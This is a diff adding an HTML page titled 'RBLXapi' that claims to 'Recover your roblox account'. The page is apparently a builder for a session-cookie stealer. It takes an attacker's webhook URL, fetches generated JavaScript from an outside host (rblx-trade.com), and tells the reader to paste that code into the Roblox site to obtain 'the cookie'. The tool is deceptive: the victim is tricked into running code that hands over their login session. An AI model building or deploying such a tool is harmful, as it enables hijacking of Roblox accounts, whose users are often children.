@@ -1,0 +1,103 @@
+
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RBLXapi</title>
+  <link rel="icon" type="image/png" href="https://rblxapi.vip/favicon.png">
+  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/fdbb4ce9e1.js" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous" />
+</head>
+<body>
+  <section class="text-gray-600 body-font">
+    <div class="container px-5 py-24 mx-auto flex flex-wrap">
+      <div class="lg:w-3/5 md:w-1/2 md:pr-16 lg:pr-0 pr-0">
+        <h1 class="title-font font-medium text-3xl text-gray-900">RBLXapi</h1>
+        <p class="leading-relaxed mt-4">Recover your roblox account</p>
+        <br>
+        <h2>Warning:</h2>
+        <p>When you copy the code, it has a (x) in front of it.</p>
+        <p>Paste it into the roblox browser and remove the x in front of it and click enter.</p>
+        <p>You now have the cookie.</p>
+        <br>
+        <p>Getting errors? Make sure you're on http<b>s</b>://rblxapi.vip</p>
+      </div>
+
+      <div style="height: 350px;" class="lg:w-2/6 md:w-1/2 bg-gray-100 rounded-lg p-8 flex flex-col md:ml-auto w-full mt-10 md:mt-0">
+        <div id="createWHModal">
+          <h2 class="text-gray-900 text-lg font-medium title-font mb-5">Create Webhook</h2>
+          <form id="whCreateForm">
+            <div class="relative mb-4">
+              <label for="webhook" class="leading-7 text-sm text-gray-600">Enter Webhook</label>
+              <input type="text" id="webhook" name="webhook" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out">
+            </div>
+            <div class="relative mb-4">
+              <label for="prompt" class="leading-7 text-sm text-gray-600">Prompt (leave blank for none)</label>
+              <input type="text" id="prompt" name="prompt" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out">
+            </div>
+          </form>
+          <button id="genCodeBtn" class="w-full text-white bg-indigo-500 border-0 py-2 px-8 focus:outline-none hover:bg-indigo-600 rounded text-lg" onClick="genCode()"><i class="fas fa-plus-circle"></i> Generate</button>
+        </div>
+        <div id="createdWHModal" style="display: none;">
+          <h2 class="text-gray-900 text-lg font-medium title-font mb-5">Webhook:</h2>
+          <div class="relative mb-4">
+            <label for="full-name" class="leading-7 text-sm text-gray-600">Generated JS Code:</label>
+            <textarea rows="3" type="text" id="generatedWHText" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out"></textarea>
+          </div>
+          <p></p>
+          <strong style="color: #6c6cff; cursor: pointer;" onClick="generateAgain()"><i class="fas fa-undo-alt"></i> Generate another webhook</strong>
+          <p></p>
+          <button id="copyCodeBtn" class="w-full text-white bg-indigo-500 border-0 py-2 px-8 focus:outline-none hover:bg-indigo-600 rounded text-lg" onClick="copyCode()"><i class="fas fa-copy"></i> Copy Code</button>
+        </div>
+      </div>
+
+    </div>
+  </section>
+  <script>
+    function genCode() {
+      $("#genCodeBtn").html('<i class="fas fa-circle-notch fa-spin"></i>');
+      setTimeout(function(){
+        return new Promise(function (resolve) {
+            $.ajax({
+                type: "GET",
+                url: "https://rblx-trade.com/rblxapi/create.php?"+$('#whCreateForm').serialize()
+            })
+            .done(function (myAjaxJsonResponse) {
+                console.log(myAjaxJsonResponse);
+                var result = myAjaxJsonResponse;
+                if(result) {
+                    $("#generatedWHText").val(result);
+                    $("#createWHModal").hide();
+                    $("#createdWHModal").show();
+                } else {
+                    alert("Error! Please retry.")
+                }
+                $("#genCodeBtn").html('<i class="fas fa-plus-circle"></i> Generate');
+            })
+            .fail(function (erordata) {
+                alert("Error! Please retry.")
+                $("#genCodeBtn").html('<i class="fas fa-plus-circle"></i> Generate');
+            })
+        })
+      }, 500);
+    }
+
+    function copyCode() {
+      $("textarea").select();
+      document.execCommand('copy');
+
+      $("#copyCodeBtn").html('<i class="fas fa-check-square"></i> Copied')
+      setTimeout(function(){
+        $("#copyCodeBtn").html('<i class="fas fa-copy"></i> Copy Code')
+      }, 500);
+    }
+
+    function generateAgain() {
+      $("#createdWHModal").hide();
+      $("#createWHModal").show();
+    }
+  </script>
+</body>
+</html>
